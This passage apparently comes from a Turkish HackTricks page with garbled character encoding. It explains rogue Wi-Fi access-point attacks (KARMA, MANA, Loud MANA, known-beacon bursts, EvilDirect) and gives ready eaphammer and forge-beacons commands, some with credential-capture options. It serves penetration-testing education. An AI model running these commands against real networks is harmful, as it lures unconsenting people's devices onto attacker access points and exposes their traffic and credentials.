3. **SSID tabanlÄ± Beyaz Liste**:
* Sahte AP, yalnÄ±zca belirli ESSID'ler iÃ§in sorgu isteklerine yanÄ±t verecek, bu ESSID'leri iÃ§ermeyen cihazlara gÃ¶rÃ¼nmez olacaktÄ±r.
4. **SSID tabanlÄ± Kara Liste**:
* Sahte AP, kara listedeki belirli ESSID'ler iÃ§in sorgu isteklerine yanÄ±t vermeyecek, bu belirli aÄŸlarÄ± arayan cihazlara gÃ¶rÃ¼nmez hale gelecektir.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Bu yÃ¶ntem, **bir saldÄ±rganÄ±n, aÄŸlara baÄŸlanmaya Ã§alÄ±ÅŸan cihazlardan gelen tÃ¼m probe isteklerine yanÄ±t veren kÃ¶tÃ¼ niyetli bir eriÅŸim noktasÄ± (AP) oluÅŸturmasÄ±na** olanak tanÄ±r. Bu teknik, **cihazlarÄ±, aradÄ±klarÄ± aÄŸlarÄ± taklit ederek saldÄ±rganÄ±n AP'sine baÄŸlanmaya kandÄ±rÄ±r**. Bir cihaz bu sahte AP'ye bir baÄŸlantÄ± isteÄŸi gÃ¶nderdiÄŸinde, baÄŸlantÄ±yÄ± tamamlar ve cihazÄ±n yanlÄ±ÅŸlÄ±kla saldÄ±rganÄ±n aÄŸÄ±na baÄŸlanmasÄ±na neden olur.

### MANA

Daha sonra, **cihazlar istenmeyen aÄŸ yanÄ±tlarÄ±nÄ± gÃ¶rmezden gelmeye baÅŸladÄ±**, bu da orijinal karma saldÄ±rÄ±sÄ±nÄ±n etkinliÄŸini azalttÄ±. Ancak, Ian de Villiers ve Dominic White tarafÄ±ndan tanÄ±tÄ±lan **MANA saldÄ±rÄ±sÄ±** olarak bilinen yeni bir yÃ¶ntem ortaya Ã§Ä±ktÄ±. Bu yÃ¶ntem, sahte AP'nin **cihazlarÄ±n yayÄ±nladÄ±ÄŸÄ± probe isteklerine yanÄ±t vererek Tercih Edilen AÄŸ Listelerini (PNL) yakalamasÄ±nÄ±** iÃ§erir; bu yanÄ±tlar, cihazlar tarafÄ±ndan daha Ã¶nce talep edilen aÄŸ adlarÄ± (SSID'ler) ile yapÄ±lÄ±r. Bu sofistike saldÄ±rÄ±, cihazlarÄ±n bildikleri aÄŸlarÄ± hatÄ±rlama ve Ã¶nceliklendirme ÅŸekillerini istismar ederek orijinal karma saldÄ±rÄ±sÄ±na karÅŸÄ± korumalarÄ± aÅŸar.

MANA saldÄ±rÄ±sÄ±, cihazlardan gelen hem yÃ¶nlendirilmiÅŸ hem de yayÄ±nlanmÄ±ÅŸ probe isteklerini izleyerek Ã§alÄ±ÅŸÄ±r. YÃ¶nlendirilmiÅŸ istekler iÃ§in, cihazÄ±n MAC adresini ve talep edilen aÄŸ adÄ±nÄ± kaydeder, bu bilgiyi bir listeye ekler. Bir yayÄ±n isteÄŸi alÄ±ndÄ±ÄŸÄ±nda, AP, cihazÄ±n listesindeki aÄŸlardan herhangi biriyle eÅŸleÅŸen bilgilerle yanÄ±t verir ve cihazÄ± sahte AP'ye baÄŸlanmaya teÅŸvik eder.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Bir **Loud MANA saldÄ±rÄ±sÄ±**, cihazlarÄ±n yÃ¶nlendirilmiÅŸ sorgulama kullanmadÄ±ÄŸÄ± veya Tercih Edilen AÄŸ Listeleri (PNL) saldÄ±rgana bilinmediÄŸi durumlar iÃ§in geliÅŸmiÅŸ bir stratejidir. Bu, **aynÄ± alandaki cihazlarÄ±n PNL'lerinde bazÄ± aÄŸ adlarÄ±nÄ± paylaÅŸma olasÄ±lÄ±ÄŸÄ±nÄ±n yÃ¼ksek olduÄŸu** ilkesine dayanÄ±r. SeÃ§ici bir ÅŸekilde yanÄ±t vermek yerine, bu saldÄ±rÄ± gÃ¶zlemlenen tÃ¼m cihazlarÄ±n birleÅŸtirilmiÅŸ PNL'lerinde bulunan her aÄŸ adÄ± (ESSID) iÃ§in sorgu yanÄ±tlarÄ±nÄ± yayÄ±nlar. Bu geniÅŸ yaklaÅŸÄ±m, bir cihazÄ±n tanÄ±dÄ±k bir aÄŸÄ± tanÄ±ma ve sahte EriÅŸim NoktasÄ±na (AP) baÄŸlanma giriÅŸiminde bulunma olasÄ±lÄ±ÄŸÄ±nÄ± artÄ±rÄ±r.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

**Loud MANA attack** yeterli olmadÄ±ÄŸÄ±nda, **Known Beacon attack** baÅŸka bir yaklaÅŸÄ±m sunar. Bu yÃ¶ntem, **bir aÄŸ adÄ±yla yanÄ±t veren bir AP'yi simÃ¼le ederek baÄŸlantÄ± sÃ¼recini brute-force ile zorlar, potansiyel ESSID'lerin bir listesini dÃ¶ngÃ¼ye alarak** bir kelime listesinden tÃ¼retilmiÅŸtir. Bu, birÃ§ok aÄŸÄ±n varlÄ±ÄŸÄ±nÄ± simÃ¼le eder, umarak kurbanÄ±n PNL'sindeki bir ESSID ile eÅŸleÅŸir ve uydurma AP'ye bir baÄŸlantÄ± denemesi yapar. SaldÄ±rÄ±, cihazlarÄ± yakalamak iÃ§in daha agresif bir deneme yapmak amacÄ±yla `--loud` seÃ§eneÄŸi ile birleÅŸtirilerek artÄ±rÄ±labilir.

Eaphammer bu saldÄ±rÄ±yÄ±, listedeki tÃ¼m ESSID'lerin yÃ¼klendiÄŸi bir MANA saldÄ±rÄ±sÄ± olarak uyguladÄ± (bunu `--loud` ile birleÅŸtirerek Loud MANA + Known beacons attack oluÅŸturabilirsiniz):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Bilinen Beacon Burst saldÄ±rÄ±sÄ±**

**Bilinen Beacon Burst saldÄ±rÄ±sÄ±**, bir dosyada listelenen her ESSID iÃ§in **hÄ±zlÄ± bir ÅŸekilde beacon Ã§erÃ§evelerinin yayÄ±nlanmasÄ±nÄ±** iÃ§erir. Bu, sahte aÄŸlarÄ±n yoÄŸun bir ortamÄ±nÄ± yaratÄ±r ve cihazlarÄ±n kÃ¶tÃ¼ niyetli AP'ye baÄŸlanma olasÄ±lÄ±ÄŸÄ±nÄ± bÃ¼yÃ¼k Ã¶lÃ§Ã¼de artÄ±rÄ±r, Ã¶zellikle de bir MANA saldÄ±rÄ±sÄ±yla birleÅŸtirildiÄŸinde. Bu teknik, cihazlarÄ±n aÄŸ seÃ§im mekanizmalarÄ±nÄ± aÅŸmak iÃ§in hÄ±z ve hacimden yararlanÄ±r.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct**, cihazlarÄ±n geleneksel bir kablosuz eriÅŸim noktasÄ± olmadan Wi-Fi kullanarak doÄŸrudan birbirleriyle baÄŸlantÄ± kurmalarÄ±nÄ± saÄŸlayan bir protokoldÃ¼r. Bu yetenek, yazÄ±cÄ±lar ve televizyonlar gibi Ã§eÅŸitli Nesnelerin Ä°nterneti (IoT) cihazlarÄ±na entegre edilmiÅŸtir ve doÄŸrudan cihazdan cihaza iletiÅŸimi kolaylaÅŸtÄ±rÄ±r. Wi-Fi Direct'in dikkat Ã§ekici bir Ã¶zelliÄŸi, bir cihazÄ±n baÄŸlantÄ±yÄ± yÃ¶netmek iÃ§in grup sahibi olarak bilinen bir eriÅŸim noktasÄ± rolÃ¼nÃ¼ Ã¼stlenmesidir.

Wi-Fi Direct baÄŸlantÄ±larÄ± iÃ§in gÃ¼venlik, birkaÃ§ gÃ¼venli eÅŸleÅŸtirme yÃ¶ntemini destekleyen **Wi-Fi Protected Setup (WPS)** aracÄ±lÄ±ÄŸÄ±yla saÄŸlanÄ±r:

* **Push-Button Configuration (PBC)**
* **PIN giriÅŸi**
* **Near-Field Communication (NFC)**

Bu yÃ¶ntemler, Ã¶zellikle PIN giriÅŸi, geleneksel Wi-Fi aÄŸlarÄ±ndaki WPS ile aynÄ± gÃ¼venlik aÃ§Ä±klarÄ±na maruz kalmaktadÄ±r ve benzer saldÄ±rÄ± vektÃ¶rlerinin hedefi haline gelmektedir.

### EvilDirect Hijacking

**EvilDirect Hijacking**, Wi-Fi Direct'e Ã¶zgÃ¼ bir saldÄ±rÄ±dÄ±r. Evil Twin saldÄ±rÄ±sÄ±nÄ±n konseptini yansÄ±tÄ±r, ancak Wi-Fi Direct baÄŸlantÄ±larÄ±nÄ± hedef alÄ±r. Bu senaryoda, bir saldÄ±rgan meÅŸru bir grup sahibini taklit ederek cihazlarÄ± kÃ¶tÃ¼ niyetli bir varlÄ±ÄŸa baÄŸlanmaya ikna etmeyi amaÃ§lar. Bu yÃ¶ntem, taklit edilen cihazÄ±n kanalÄ±nÄ±, ESSID'sini ve MAC adresini belirterek `airbase-ng` gibi araÃ§lar kullanÄ±larak gerÃ§ekleÅŸtirilebilir.

## References

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) adresine gÃ¶z atÄ±n (facebook ile giriÅŸ ve captive portallarda WPA taklidi)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**Real-Time Hack News**\
HÄ±zla deÄŸiÅŸen hacking dÃ¼nyasÄ±nda gÃ¼ncel kalmak iÃ§in gerÃ§ek zamanlÄ± haberler ve bilgiler edinin

**Latest Announcements**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
